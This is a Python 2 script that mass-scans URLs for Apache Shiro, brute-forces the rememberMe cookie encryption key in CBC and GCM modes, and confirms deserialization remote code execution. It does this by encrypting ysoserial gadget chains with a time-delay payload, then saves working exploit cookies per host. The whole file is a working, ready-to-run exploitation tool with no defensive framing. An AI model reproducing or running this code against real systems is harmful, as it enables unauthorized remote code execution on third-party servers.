#coding=utf-8

import requests
import uuid
import base64
import subprocess
from urlparse import urlparse
from Crypto.Cipher import AES
from Crypto import Random
from base64 import b64encode
import warnings
import os

warnings.filterwarnings('ignore')

def checkIsShiro(url):
    try:
        h = requests.get(url.strip(),headers=headers,timeout=3,verify=False,allow_redirects=False)
        #print h.headers
        print '[*] SCAN ' + url.strip() + " STATUS " + str(h.status_code)
        #print [k.lower() for k in h.headers.keys()]
        if "set-cookie" in [k.lower() for k in h.headers.keys()]:
            if "rememberMe=deleteMe" in h.headers['set-cookie']:
                print "[++] "+url.strip() + "  IS  SHIRO"
                return True
    except:
        return False

        
def findValidKey(url,key,mode,payload):
    for m in mode:
        if m == 'CBC':
            cookieraw = CBCCipher(key,payload)
        elif m == 'GCM':
            cookieraw = GCMCipher(key,payload)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
            "Cookie": "rememberMe=%s"%cookieraw,
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Connection": "close"
        }
        try:
            h = requests.get(url.strip(),headers=headers,timeout=3,verify=False,allow_redirects=False)
            if "set-cookie" in [k.lower() for k in h.headers.keys()]:
                if "rememberMe=deleteMe" in h.headers['set-cookie']:
                    continue
                else:             
                    print "[++] " + url.strip() + " -> KEY FIND [" + key.strip() + "]" + "  Mode:" +m
                    return m
            else:
                print "[++] " + url.strip() + " -> KEY FIND [" + key.strip() + "]" + "  Mode:" +m
                return m
        except:
            continue
            
        return None
        

#1.4.2及以上版本使用GCM加密
def GCMCipher(key,file_body):
    iv = os.urandom(16)
    cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)          
    ciphertext, tag = cipher.encrypt_and_digest(file_body) 
    ciphertext = ciphertext + tag   
    base64_ciphertext = base64.b64encode(iv + ciphertext)
    return base64_ciphertext


def CBCCipher(key,file_body):
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    file_body = pad(file_body)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext
    
    
def checkShiroVul(url,gadget,command,key,mode):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
        "Cookie": "rememberMe=%s" % encodeRememberMe(gadget,command,key,mode),
        "Connection": "close",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }
    try:
        requests.get(url.strip(), headers=headers, timeout=4, verify=False,allow_redirects=False)
        return False
    except:
        message = "[++]   "+ url.strip() + '  ['+gadget+ ']' + '  ['+key+']  '+" can be use"
        print message
        return True

def encodeRememberMe(gadget,command,key,mode):
    popen = subprocess.Popen(['java', '-jar', 'ysoserial-0.0.7-SNAPSHOT-all.jar', gadget, command], stdout=subprocess.PIPE)
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    file_body = pad(popen.stdout.read())
    if mode == 'CBC':
        return CBCCipher(key,file_body)
    elif mode == 'GCM':
        return GCMCipher(key,file_body)

def writeCookie(gadget,url,key,command,mode):
    host = urlparse(url.strip()).netloc
    filename = 'success/'+str(host).replace('.','-').replace(':','-') + '.txt'
    cookie = encodeRememberMe(gadget,command,key.strip(),mode)
    with open(filename,'w') as f:
        f.write(url.strip() + "  key:"+key.strip() + "  mode:"+mode)
        f.write('\n\n')
        f.write("Gadget: "+ gadget)
        f.write('\r\n')
        f.write("rememberMe="+cookie)
        f.flush()


if __name__ == '__main__':
    # print encodeRememberMe("CommonsCollections8","tomcat","kPH+bIxk5D2deZiIxcaaaA==")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
        "Cookie": "rememberMe=123",
        "Connection": "close",
        "Accept-Language": "zh-CN,zh;q=0.9"
    }
    payload = "\xac\xed\x00\x05sr\x002org.apache.shiro.subject.SimplePrincipalCollection\xa8\x7fX%\xc6\xa3\x08J\x03\x00\x01L\x00\x0frealmPrincipalst\x00\x0fLjava/util/Map;xppw\x01\x00x"
    #payload = open("simple.dat","rb").read()
    gadgets = ['CommonsCollections8', 'CommonsCollections11', 'CommonsBeanutils1', 'CommonsCollections9',
               'CommonsCollections2']
    command = ['code:Thread.sleep(4000L);']
    encryptMode = ['CBC','GCM']
    for url in open("url.txt", "r"):
        if(checkIsShiro(url)):
            for key in open("100keys.txt", "r"):
                print "Start check key : " + key.strip()
                m = findValidKey(url,key.strip(),encryptMode,payload)
                if(m):
                    print "Start Find Valid Gadget"
                    for gadget in gadgets:
                        if(checkShiroVul(url,gadget,command,key.strip(),m)):
                            writeCookie(gadget,url,key,"class1",m)
                            break
                    else:
                        print "NO Valid Gadget Find"
                    break
            else:
                print "[*] "+url.strip() + " NO KEY Find"
    #print encrypt(base64.b64decode("kPH+bIxk5D2deZiIxcaaaA=="),payload)

